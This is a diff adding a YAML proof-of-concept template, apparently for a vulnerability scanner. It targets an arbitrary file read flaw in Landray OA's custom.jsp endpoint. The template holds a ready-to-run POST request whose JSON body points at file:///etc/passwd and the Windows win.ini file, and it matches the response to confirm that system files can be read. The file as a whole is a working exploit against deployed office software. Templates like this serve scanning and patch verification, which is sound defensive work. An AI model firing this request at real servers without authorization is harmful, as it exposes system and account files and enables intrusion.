@@ -1,0 +1,24 @@
+id: poc-yaml-Landray-oa-custom-jsp-arbitrary-file-read
+info:
+  name: 蓝凌OA Custom.Jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: 蓝凌OA
+  osprey-id: vb_2021_0036
+variables:
+  r_data_linux: 'file:///etc/passwd
+
+    file:///c://windows/win.ini'
+requests:
+- method: POST
+  path: /sys/ui/extend/varkind/custom.jsp
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101
+      Firefox/86.0
+    Content-Type: application/x-www-form-urlencoded
+  data: var={"body":{"file":"{{.r_data_linux}}"}}"
+  expression: "(\n  contains(body, \"root:\") && contains(body, \"/bin\") ||\n  contains(body,\
+    \ \"; for 16-bit app support\")\n) && !contains(body, \"<\")\n"
+transport: http
